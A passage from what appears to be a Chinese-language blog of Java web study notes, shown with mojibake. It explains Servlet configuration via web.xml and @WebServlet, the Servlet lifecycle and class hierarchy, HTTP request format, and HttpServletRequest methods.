class="string">&quot;/Users/sloth/Sites/localhost/xxe-lab&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure></div><p>åªéœ€è¦è®¿é—®<a class="link"   href="http://localhost:8080/context/php_XXE/" >http://localhost:8080/context/php_XXE/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote><h2 id="é™æ€ç›®å½•å’ŒåŠ¨æ€ç›®å½•"><a href="#é™æ€ç›®å½•å’ŒåŠ¨æ€ç›®å½•" class="headerlink" title="é™æ€ç›®å½•å’ŒåŠ¨æ€ç›®å½•"></a>é™æ€ç›®å½•å’ŒåŠ¨æ€ç›®å½•</h2><h3 id="ç›®å½•ç»“æ„"><a href="#ç›®å½•ç»“æ„" class="headerlink" title="ç›®å½•ç»“æ„"></a>ç›®å½•ç»“æ„</h3><p>javaåŠ¨æ€é¡¹ç›®çš„ç›®å½•ç»“æ„ï¼š</p><p>-- é¡¹ç›®çš„æ ¹ç›®å½•ï¼ˆROOTï¼‰<br>    -- WEB-INFç›®å½•ï¼š<br>        -- web.xmlï¼šwebé¡¹ç›®çš„æ ¸å¿ƒé…ç½®æ–‡ä»¶<br>        -- classesç›®å½•ï¼šæ”¾ç½®å­—èŠ‚ç æ–‡ä»¶çš„ç›®å½•<br>        -- libç›®å½•ï¼šæ”¾ç½®ä¾èµ–çš„jaråŒ…</p><h3 id="å°†Tomcaté›†æˆåˆ°IDEAä¸­å¹¶ä¸”åˆ›å»ºJavaEEçš„é¡¹ç›®éƒ¨ç½²é¡¹ç›®"><a href="#å°†Tomcaté›†æˆåˆ°IDEAä¸­å¹¶ä¸”åˆ›å»ºJavaEEçš„é¡¹ç›®éƒ¨ç½²é¡¹ç›®" class="headerlink" title="å°†Tomcaté›†æˆåˆ°IDEAä¸­å¹¶ä¸”åˆ›å»ºJavaEEçš„é¡¹ç›®éƒ¨ç½²é¡¹ç›®"></a>å°†Tomcaté›†æˆåˆ°IDEAä¸­å¹¶ä¸”åˆ›å»ºJavaEEçš„é¡¹ç›®éƒ¨ç½²é¡¹ç›®</h3><h1 id="Servelet-server-applet"><a href="#Servelet-server-applet" class="headerlink" title="Servelet--server applet"></a>Servelet--server applet</h1><h3 id="æ¦‚å¿µï¼šè¿è¡Œåœ¨æœåŠ¡å™¨ç«¯çš„å°ç¨‹åº"><a href="#æ¦‚å¿µï¼šè¿è¡Œåœ¨æœåŠ¡å™¨ç«¯çš„å°ç¨‹åº" class="headerlink" title="æ¦‚å¿µï¼šè¿è¡Œåœ¨æœåŠ¡å™¨ç«¯çš„å°ç¨‹åº"></a>æ¦‚å¿µï¼šè¿è¡Œåœ¨æœåŠ¡å™¨ç«¯çš„å°ç¨‹åº</h3><ul><li>Servletå°±æ˜¯ä¸€ä¸ªæ¥å£ï¼Œå®šä¹‰äº†Javaç±»è¢«æµè§ˆå™¨è®¿é—®åˆ°(tomcatè¯†åˆ«)çš„è§„åˆ™ã€‚</li><li>å°†æ¥æˆ‘ä»¬è‡ªå®šä¹‰ä¸€ä¸ªç±»ï¼Œå®ç°Servletæ¥å£ï¼Œå¤å†™æ–¹æ³•ã€‚</li></ul><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/e6c9d24ely1h5ier7fakoj212a0howfv.jpg"                      alt="image-20220825021654848"                ><figcaption>image-20220825021654848</figcaption></figure></p><blockquote><p>Servletç›¸å…³ç±»å’Œæ–¹æ³•åœ¨Java EEä¸­</p></blockquote><h2 id="å¿«é€Ÿå…¥é—¨-3"><a href="#å¿«é€Ÿå…¥é—¨-3" class="headerlink" title="å¿«é€Ÿå…¥é—¨"></a>å¿«é€Ÿå…¥é—¨</h2><ol><li><p>åˆ›å»ºJavaEEé¡¹ç›®</p></li><li><p>å®šä¹‰ä¸€ä¸ªç±»ï¼Œå®ç°Servletæ¥å£</p><ul><li>public class ServletDemo1 implements Servlet</li></ul><p></p></li><li><p>å®ç°æ¥å£ä¸­çš„æŠ½è±¡æ–¹æ³•</p></li><li><p>é…ç½®Servlet<br>åœ¨web.xmlä¸­é…ç½®ï¼š</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--é…ç½®Servlet --&gt;</span></span><br><span class="line"><span class="comment">&lt;!--ç»™classé‡æ–°å®šäº†ä¸ªåå­— servlet-nameæ ‡ç­¾å†…å®¹--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>demo1<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.itcast.web.servlet.ServletDemo1<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--é€šè¿‡ /demo1 è®¿é—®å‘½åä¸ºdemo1çš„ç±»--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>demo1<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/demo1<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure></div></li></ol><h2 id="æ‰§è¡ŒåŸç†"><a href="#æ‰§è¡ŒåŸç†" class="headerlink" title="æ‰§è¡ŒåŸç†"></a>æ‰§è¡ŒåŸç†</h2><ol><li><p>å½“æœåŠ¡å™¨æ¥å—åˆ°å®¢æˆ·ç«¯æµè§ˆå™¨çš„è¯·æ±‚åï¼Œä¼šè§£æè¯·æ±‚URLè·¯å¾„ï¼Œè·å–è®¿é—®çš„Servletçš„èµ„æºè·¯å¾„</p></li><li><p>æŸ¥æ‰¾web.xmlæ–‡ä»¶ï¼Œæ˜¯å¦æœ‰å¯¹åº”çš„<url-pattern>æ ‡ç­¾ä½“å†…å®¹ã€‚</p></li><li><p>å¦‚æœæœ‰ï¼Œåˆ™åœ¨æ‰¾åˆ°å¯¹åº”çš„<servlet-class>å…¨ç±»å</p></li><li><p>tomcatä¼šå°†å­—èŠ‚ç æ–‡ä»¶åŠ è½½è¿›å†…å­˜ï¼Œå¹¶ä¸”åˆ›å»ºå…¶å¯¹è±¡</p></li><li><p>è°ƒç”¨å…¶æ–¹æ³•</p></li></ol><h2 id="ç”Ÿå‘½å‘¨æœŸæ–¹æ³•"><a href="#ç”Ÿå‘½å‘¨æœŸæ–¹æ³•" class="headerlink" title="ç”Ÿå‘½å‘¨æœŸæ–¹æ³•"></a>ç”Ÿå‘½å‘¨æœŸæ–¹æ³•</h2><h3 id="è¢«åˆ›å»ºï¼šæ‰§è¡Œinitæ–¹æ³•ï¼Œåªæ‰§è¡Œä¸€æ¬¡"><a href="#è¢«åˆ›å»ºï¼šæ‰§è¡Œinitæ–¹æ³•ï¼Œåªæ‰§è¡Œä¸€æ¬¡" class="headerlink" title="è¢«åˆ›å»ºï¼šæ‰§è¡Œinitæ–¹æ³•ï¼Œåªæ‰§è¡Œä¸€æ¬¡"></a>è¢«åˆ›å»ºï¼šæ‰§è¡Œinitæ–¹æ³•ï¼Œåªæ‰§è¡Œä¸€æ¬¡</h3><h4 id="Servletä»€ä¹ˆæ—¶å€™è¢«åˆ›å»ºï¼Ÿ"><a href="#Servletä»€ä¹ˆæ—¶å€™è¢«åˆ›å»ºï¼Ÿ" class="headerlink" title="Servletä»€ä¹ˆæ—¶å€™è¢«åˆ›å»ºï¼Ÿ"></a>Servletä»€ä¹ˆæ—¶å€™è¢«åˆ›å»ºï¼Ÿ</h4><ul><li><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œç¬¬ä¸€æ¬¡è¢«è®¿é—®æ—¶ï¼ŒServletè¢«åˆ›å»º</p></li><li><p>å¯ä»¥é…ç½®æ‰§è¡ŒServletçš„åˆ›å»ºæ—¶æœºã€‚ web.xmlä¸­</p><ul><li><p>åœ¨<servlet>æ ‡ç­¾ä¸‹é…ç½®</p><ol><li><p>ç¬¬ä¸€æ¬¡è¢«è®¿é—®æ—¶ï¼Œåˆ›å»º</p><ul><li><load-on-startup>çš„å€¼ä¸ºè´Ÿæ•° é»˜è®¤å€¼ä¸º-1</li></ul></li><li><p>åœ¨æœåŠ¡å™¨å¯åŠ¨æ—¶ï¼Œåˆ›å»º</p><ul><li><p><load-on-startup>çš„å€¼ä¸º0æˆ–æ­£æ•´æ•° ä¸€èˆ¬é…0-10</p><blockquote><p>è¶Šå°çš„æ•´æ•°ä¼˜å…ˆçº§è¶Šé«˜</p></blockquote></li></ul></li></ol></li></ul></li></ul><ul><li>Servletçš„initæ–¹æ³•ï¼Œåªæ‰§è¡Œä¸€æ¬¡ï¼Œè¯´æ˜ä¸€ä¸ªServletåœ¨å†…å­˜ä¸­åªå­˜åœ¨ä¸€ä¸ªå¯¹è±¡ï¼ŒServletæ˜¯å•ä¾‹çš„</li><li>å¤šä¸ªç”¨æˆ·åŒæ—¶è®¿é—®æ—¶ï¼Œå¯èƒ½å­˜åœ¨çº¿ç¨‹å®‰å…¨é—®é¢˜ã€‚<br>* è§£å†³ï¼šå°½é‡ä¸è¦åœ¨Servletä¸­å®šä¹‰æˆå‘˜å˜é‡ã€‚å³ä½¿å®šä¹‰äº†æˆå‘˜å˜é‡ï¼Œä¹Ÿä¸è¦å¯¹ä¿®æ”¹å€¼</li></ul><h3 id="æä¾›æœåŠ¡ï¼šæ‰§è¡Œserviceæ–¹æ³•ï¼Œæ‰§è¡Œå¤šæ¬¡"><a href="#æä¾›æœåŠ¡ï¼šæ‰§è¡Œserviceæ–¹æ³•ï¼Œæ‰§è¡Œå¤šæ¬¡" class="headerlink" title="æä¾›æœåŠ¡ï¼šæ‰§è¡Œserviceæ–¹æ³•ï¼Œæ‰§è¡Œå¤šæ¬¡"></a>æä¾›æœåŠ¡ï¼šæ‰§è¡Œserviceæ–¹æ³•ï¼Œæ‰§è¡Œå¤šæ¬¡</h3><ul><li>æ¯æ¬¡è®¿é—®Servletæ—¶ï¼ŒServiceæ–¹æ³•éƒ½ä¼šè¢«è°ƒç”¨ä¸€æ¬¡ã€‚</li></ul><h3 id="è¢«é”€æ¯ï¼šæ‰§è¡Œdestroyæ–¹æ³•ï¼Œåªæ‰§è¡Œä¸€æ¬¡"><a href="#è¢«é”€æ¯ï¼šæ‰§è¡Œdestroyæ–¹æ³•ï¼Œåªæ‰§è¡Œä¸€æ¬¡" class="headerlink" title="è¢«é”€æ¯ï¼šæ‰§è¡Œdestroyæ–¹æ³•ï¼Œåªæ‰§è¡Œä¸€æ¬¡"></a>è¢«é”€æ¯ï¼šæ‰§è¡Œdestroyæ–¹æ³•ï¼Œåªæ‰§è¡Œä¸€æ¬¡</h3><ul><li>Servletè¢«é”€æ¯æ—¶æ‰§è¡Œã€‚æœåŠ¡å™¨å…³é—­æ—¶ï¼ŒServletè¢«é”€æ¯</li><li>åªæœ‰æœåŠ¡å™¨<u>æ­£å¸¸å…³é—­</u>æ—¶ï¼Œæ‰ä¼šæ‰§è¡Œdestroyæ–¹æ³•ã€‚</li><li>destroyæ–¹æ³•åœ¨Servletè¢«é”€æ¯ä¹‹å‰æ‰§è¡Œï¼Œä¸€èˆ¬ç”¨äºé‡Šæ”¾èµ„æº</li></ul><h2 id="æ³¨è§£é…ç½®"><a href="#æ³¨è§£é…ç½®" class="headerlink" title="æ³¨è§£é…ç½®"></a>æ³¨è§£é…ç½®</h2><ul><li><p>Servlet3.0ï¼š</p><ul><li>å¥½å¤„ï¼šæ”¯æŒæ³¨è§£é…ç½®ã€‚å¯ä»¥ä¸éœ€è¦web.xmläº†ã€‚</li></ul></li><li><p>æ­¥éª¤ï¼š</p><ol><li><p>åˆ›å»ºJavaEEé¡¹ç›®ï¼Œé€‰æ‹©Servletçš„ç‰ˆæœ¬3.0ä»¥ä¸Šï¼Œå¯ä»¥ä¸åˆ›å»ºweb.xml</p></li><li><p>å®šä¹‰ä¸€ä¸ªç±»ï¼Œå®ç°Servletæ¥å£</p></li><li><p>å¤å†™æ–¹æ³•</p></li><li><p>åœ¨ç±»ä¸Šä½¿ç”¨@WebServletæ³¨è§£ï¼Œè¿›è¡Œé…ç½®</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;èµ„æºè·¯å¾„&quot;)</span></span><br><span class="line"><span class="meta">@WebServlet(urlPatterns = &quot;/demo&quot;)</span> <span class="comment">//é€šè¿‡/demoè®¿é—®</span></span><br><span class="line"><span class="meta">@WebServlet(value = &quot;/demo&quot;)</span></span><br><span class="line"><span class="meta">@WebServlet(&quot;/demo&quot;)</span> <span class="comment">//æœ€ç®€æ´</span></span><br></pre></td></tr></table></figure></div></li></ol></li></ul><p>è¯¥æ³¨è§£å…·ä½“å®ç°</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Target(&#123;ElementType.TYPE&#125;)</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> WebServlet &#123;</span><br><span class="line">    String <span class="title function_">name</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;&quot;</span>;<span class="comment">//ç›¸å½“äº&lt;Servlet-name&gt;</span></span><br><span class="line"></span><br><span class="line">    String[] value() <span class="keyword">default</span> &#123;&#125;;<span class="comment">//ä»£è¡¨urlPatterns()å±æ€§é…ç½®</span></span><br><span class="line"></span><br><span class="line">    String[] urlPatterns() <span class="keyword">default</span> &#123;&#125;;<span class="comment">//ç›¸å½“äº&lt;url-pattern&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="title function_">loadOnStartup</span><span class="params">()</span> <span class="keyword">default</span> -<span class="number">1</span>;<span class="comment">//ç›¸å½“äº&lt;load-on-startup&gt;</span></span><br><span class="line"></span><br><span class="line">    WebInitParam[] initParams() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">asyncSupported</span><span class="params">()</span> <span class="keyword">default</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    String <span class="title function_">smallIcon</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    String <span class="title function_">largeIcon</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    String <span class="title function_">description</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    String <span class="title function_">displayName</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="IDEAä¸tomcatçš„ç›¸å…³é…ç½®"><a href="#IDEAä¸tomcatçš„ç›¸å…³é…ç½®" class="headerlink" title="IDEAä¸tomcatçš„ç›¸å…³é…ç½®"></a>IDEAä¸tomcatçš„ç›¸å…³é…ç½®</h2><ol><li><p>IDEAä¼šä¸ºæ¯ä¸€ä¸ªtomcatéƒ¨ç½²çš„é¡¹ç›®å•ç‹¬å»ºç«‹ä¸€ä»½é…ç½®æ–‡ä»¶</p><ul><li>æŸ¥çœ‹æ§åˆ¶å°çš„logï¼šUsing CATALINA_BASE:   "/Users/sloth/Library/Caches/JetBrains/IntelliJIdea2021.3/tomcat/156bc142-4965-43d6-8ff6-003e52b2fb0f"</li></ul></li><li><p>å·¥ä½œç©ºé—´é¡¹ç›®å’Œtomcatéƒ¨ç½²çš„webé¡¹ç›®</p><ul><li>tomcatçœŸæ­£è®¿é—®çš„æ˜¯â€œtomcatéƒ¨ç½²çš„webé¡¹ç›®â€ï¼Œ"tomcatéƒ¨ç½²çš„webé¡¹ç›®"å¯¹åº”ç€"å·¥ä½œç©ºé—´é¡¹ç›®" çš„webç›®å½•ä¸‹çš„æ‰€æœ‰èµ„æº</li><li>WEB-INFç›®å½•ä¸‹çš„èµ„æºä¸èƒ½è¢«æµè§ˆå™¨ç›´æ¥è®¿é—®ã€‚</li></ul></li><li><p>æ–­ç‚¹è°ƒè¯•ï¼šä½¿ç”¨"å°è™«å­"å¯åŠ¨ dubug å¯åŠ¨</p></li></ol><h2 id="Servletçš„ä½“ç³»ç»“æ„"><a href="#Servletçš„ä½“ç³»ç»“æ„" class="headerlink" title="Servletçš„ä½“ç³»ç»“æ„"></a>Servletçš„ä½“ç³»ç»“æ„</h2><p>Servlet -- æ¥å£<br>        |<br>GenericServlet -- æŠ½è±¡ç±»<br>        |<br>HttpServlet  -- æŠ½è±¡ç±»</p><ul><li><p>GenericServletï¼šå°†Servletæ¥å£ä¸­å…¶ä»–çš„æ–¹æ³•åšäº†é»˜è®¤ç©ºå®ç°ï¼Œåªå°†service()æ–¹æ³•ä½œä¸ºæŠ½è±¡</p></li><li><p>å°†æ¥å®šä¹‰Servletç±»æ—¶ï¼Œå¯ä»¥ç»§æ‰¿GenericServletï¼Œå®ç°service()æ–¹æ³•å³å¯</p></li></ul><ul><li>HttpServletï¼šå¯¹httpåè®®çš„ä¸€ç§å°è£…ï¼Œç®€åŒ–æ“ä½œ<br>1. å®šä¹‰ç±»ç»§æ‰¿HttpServlet<br> 2. åªéœ€è¦å¤å†™doGet/doPost/ã€‚ã€‚ã€‚(HTTP7ç§è¯·æ±‚æ–¹å¼)æ–¹æ³•ï¼Œå¯¹get postç­‰æ–¹å¼æ¥æ”¶å¯¹æ•°æ®å¤„ç†æ–¹æ³•</li></ul><blockquote><p>æµè§ˆå™¨ç›´æ¥è®¿é—®ç½‘å€ï¼Œé»˜è®¤å‘é€getè¯·æ±‚</p></blockquote><h2 id="Servletç›¸å…³é…ç½®"><a href="#Servletç›¸å…³é…ç½®" class="headerlink" title="Servletç›¸å…³é…ç½®"></a>Servletç›¸å…³é…ç½®</h2><p>urlpartten:Servletè®¿é—®è·¯å¾„</p><ul><li>ä¸€ä¸ªServletå¯ä»¥å®šä¹‰å¤šä¸ªè®¿é—®è·¯å¾„ ï¼š @WebServlet({"/d4","/dd4","/ddd4"})</li><li>è·¯å¾„å®šä¹‰è§„åˆ™<ol><li>/xxxï¼šè·¯å¾„åŒ¹é…</li><li>/xxx/xxx:å¤šå±‚è·¯å¾„ï¼Œç›®å½•ç»“æ„ <code>/test/*</code> (*é€šé…ç¬¦å¯ä»¥åŒ¹é…ä»»æ„ï¼Œå› æ­¤è¿™ä¸ªè¡¨ç¤ºåªè¦è®¿é—®teståè·Ÿä»»æ„ç›®å½•ï¼Œ<code>*</code>çš„ä¼˜å…ˆçº§è¾ƒä½)</li><li>*.doï¼šæ‰©å±•ååŒ¹é… (doå¯ä»¥æ”¹æˆä»»æ„åç¼€åï¼Œå‰é¢ä¸åŠ /)</li></ol></li></ul><h1 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h1><h3 id="æ¦‚å¿µï¼šHyper-Text-Transfer-Protocol-è¶…æ–‡æœ¬ä¼ è¾“åè®®"><a href="#æ¦‚å¿µï¼šHyper-Text-Transfer-Protocol-è¶…æ–‡æœ¬ä¼ è¾“åè®®" class="headerlink" title="æ¦‚å¿µï¼šHyper Text Transfer Protocol è¶…æ–‡æœ¬ä¼ è¾“åè®®"></a>æ¦‚å¿µï¼šHyper Text Transfer Protocol è¶…æ–‡æœ¬ä¼ è¾“åè®®</h3><ul><li><p>ä¼ è¾“åè®®ï¼šå®šä¹‰äº†ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯é€šä¿¡æ—¶ï¼Œå‘é€æ•°æ®çš„æ ¼å¼</p></li><li><p>ç‰¹ç‚¹ï¼š</p><ol><li>åŸºäºTCP/IPçš„é«˜çº§åè®®</li><li>é»˜è®¤ç«¯å£å·:80</li><li>åŸºäºè¯·æ±‚/å“åº”æ¨¡å‹çš„:ä¸€æ¬¡è¯·æ±‚å¯¹åº”ä¸€æ¬¡å“åº”</li><li>æ— çŠ¶æ€çš„ï¼šæ¯æ¬¡è¯·æ±‚ä¹‹é—´ç›¸äº’ç‹¬ç«‹ï¼Œä¸èƒ½äº¤äº’æ•°æ®</li></ol></li><li><p>å†å²ç‰ˆæœ¬ï¼š<br>* 1.0ï¼šæ¯ä¸€æ¬¡è¯·æ±‚å“åº”éƒ½ä¼šå»ºç«‹æ–°çš„è¿æ¥<br>* 1.1ï¼šå¤ç”¨è¿æ¥</p></li></ul><h2 id="æ•°æ®æ ¼å¼"><a href="#æ•°æ®æ ¼å¼" class="headerlink" title="æ•°æ®æ ¼å¼"></a>æ•°æ®æ ¼å¼</h2><h3 id="è¯·æ±‚æ¶ˆæ¯æ•°æ®æ ¼å¼"><a href="#è¯·æ±‚æ¶ˆæ¯æ•°æ®æ ¼å¼" class="headerlink" title="è¯·æ±‚æ¶ˆæ¯æ•°æ®æ ¼å¼"></a>è¯·æ±‚æ¶ˆæ¯æ•°æ®æ ¼å¼</h3><ol><li><p>è¯·æ±‚è¡Œ</p><ul><li><p>æ ¼å¼ï¼š è¯·æ±‚æ–¹å¼ è¯·æ±‚url è¯·æ±‚åè®®/ç‰ˆæœ¬</p><div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /login.htmlHTTP/1.1</span><br></pre></td></tr></table></figure></div></li></ul><ul><li>è¯·æ±‚æ–¹å¼ï¼š<br>HTTPåè®®æœ‰7ä¸­è¯·æ±‚æ–¹å¼ï¼Œå¸¸ç”¨çš„æœ‰2ç§<ul><li>GETï¼š<ol><li>è¯·æ±‚å‚æ•°åœ¨è¯·æ±‚è¡Œä¸­ï¼Œåœ¨urlåã€‚</li><li>è¯·æ±‚çš„urlé•¿åº¦æœ‰é™åˆ¶çš„</li><li>ä¸å¤ªå®‰å…¨</li></ol></li><li>POST:<ol><li>è¯·æ±‚å‚æ•°åœ¨è¯·æ±‚ä½“ä¸­</li><li>è¯·æ±‚çš„urlé•¿åº¦æ²¡æœ‰é™åˆ¶çš„</li><li>ç›¸å¯¹å®‰å…¨</li></ol></li></ul></li></ul></li><li><p>è¯·æ±‚å¤´: å®¢æˆ·ç«¯æµè§ˆå™¨å‘Šè¯‰æœåŠ¡å™¨ä¸€äº›ä¿¡æ¯</p><ul><li><p>æ ¼å¼ï¼šè¯·æ±‚å¤´åç§°: è¯·æ±‚å¤´å€¼</p></li><li><p>å¸¸è§çš„è¯·æ±‚å¤´ï¼š</p><ol><li><p>User-Agentï¼šæµè§ˆå™¨å‘Šè¯‰æœåŠ¡å™¨ï¼Œæˆ‘è®¿é—®ä½ ä½¿ç”¨çš„æµè§ˆå™¨ç‰ˆæœ¬ä¿¡æ¯</p><ul><li>å¯ä»¥åœ¨æœåŠ¡å™¨ç«¯è·å–è¯¥å¤´çš„ä¿¡æ¯ï¼Œè§£å†³æµè§ˆå™¨çš„å…¼å®¹æ€§é—®é¢˜</li></ul></li><li><p>Refererï¼š<a class="link"   href="http://localhost/login.html" >http://localhost/login.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><ul><li><p>å‘Šè¯‰æœåŠ¡å™¨ï¼Œæˆ‘(å½“å‰è¯·æ±‚)ä»å“ªé‡Œæ¥ï¼Ÿ</p><p>ä½œç”¨ï¼š</p><ol><li><p>é˜²æ­¢ç›—å–é“¾æ¥</p></li><li><p>ç»Ÿè®¡å·¥ä½œ</p></li></ol></li></ul></li></ol></li></ul></li><li><p>è¯·æ±‚ç©ºè¡Œ<br>ä¸€ä¸ªç©ºè¡Œï¼Œå°±æ˜¯ç”¨äºåˆ†å‰²POSTè¯·æ±‚çš„è¯·æ±‚å¤´ï¼Œå’Œè¯·æ±‚ä½“çš„ã€‚</p></li><li><p>è¯·æ±‚ä½“(æ­£æ–‡)ï¼š</p><ul><li>å°è£…POSTè¯·æ±‚æ¶ˆæ¯çš„è¯·æ±‚å‚æ•°çš„ ï¼ˆæ”¾postå‚æ•°çš„ï¼Œgetæ²¡æœ‰ï¼‰</li></ul></li></ol><h4 id="å­—ç¬¦ä¸²æ ¼å¼ï¼š"><a href="#å­—ç¬¦ä¸²æ ¼å¼ï¼š" class="headerlink" title="å­—ç¬¦ä¸²æ ¼å¼ï¼š"></a>å­—ç¬¦ä¸²æ ¼å¼ï¼š</h4><div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /login.htmlHTTP/1.1</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://localhost/login.html</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line">username=zhangsan</span><br></pre></td></tr></table></figure></div><blockquote><p><code>Connection: keep-alive</code>è¡¨ç¤ºå¯ä»¥å¤ç”¨çš„è¿æ¥</p></blockquote><h2 id="Request"><a href="#Request" class="headerlink" title="Request"></a>Request</h2><h3 id="requestå¯¹è±¡å’Œresponseå¯¹è±¡çš„åŸç†"><a href="#requestå¯¹è±¡å’Œresponseå¯¹è±¡çš„åŸç†" class="headerlink" title="requestå¯¹è±¡å’Œresponseå¯¹è±¡çš„åŸç†"></a>requestå¯¹è±¡å’Œresponseå¯¹è±¡çš„åŸç†</h3><ol><li>requestå’Œresponseå¯¹è±¡æ˜¯ç”±æœåŠ¡å™¨åˆ›å»ºçš„ã€‚æˆ‘ä»¬æ¥ä½¿ç”¨å®ƒä»¬</li><li>requestå¯¹è±¡æ˜¯æ¥è·å–è¯·æ±‚æ¶ˆæ¯ï¼Œresponseå¯¹è±¡æ˜¯æ¥è®¾ç½®å“åº”æ¶ˆæ¯</li></ol><h3 id="requestå¯¹è±¡ç»§æ‰¿ä½“ç³»ç»“æ„"><a href="#requestå¯¹è±¡ç»§æ‰¿ä½“ç³»ç»“æ„" class="headerlink" title="requestå¯¹è±¡ç»§æ‰¿ä½“ç³»ç»“æ„"></a>requestå¯¹è±¡ç»§æ‰¿ä½“ç³»ç»“æ„</h3><p>ServletRequest--æ¥å£<br>    |ç»§æ‰¿<br>HttpServletRequest-- æ¥å£<br>    |å®ç°<br>org.apache.catalina.connector.RequestFacade ç±»(tomcat)</p><h3 id="requeståŠŸèƒ½"><a href="#requeståŠŸèƒ½" class="headerlink" title="requeståŠŸèƒ½"></a>requeståŠŸèƒ½</h3><ol><li><p>è·å–è¯·æ±‚æ¶ˆæ¯æ•°æ®</p><ol><li><p>è·å–è¯·æ±‚è¡Œæ•°æ®</p><ul><li><p>GET /day14/demo1?name=zhangsan HTTP/1.1</p></li><li><p>æ–¹æ³•ï¼š</p><ol><li>è·å–è¯·æ±‚æ–¹å¼ ï¼šGET</li></ol><ul><li>String getMethod()</li></ul><ol start="2"><li>(*)è·å–è™šæ‹Ÿç›®å½•ï¼š/day14</li></ol><ul><li>String getContextPath()</li></ul><ol start="3"><li>è·å–Servletè·¯å¾„: /demo1</li></ol><ul><li>String getServletPath()</li></ul><ol start="4"><li>è·å–getæ–¹å¼è¯·æ±‚å‚æ•°ï¼šname=zhangsan (å¦‚æœæœ‰å¤šä¸ªç”¨&è¿æ¥)</li></ol><ul><li>String 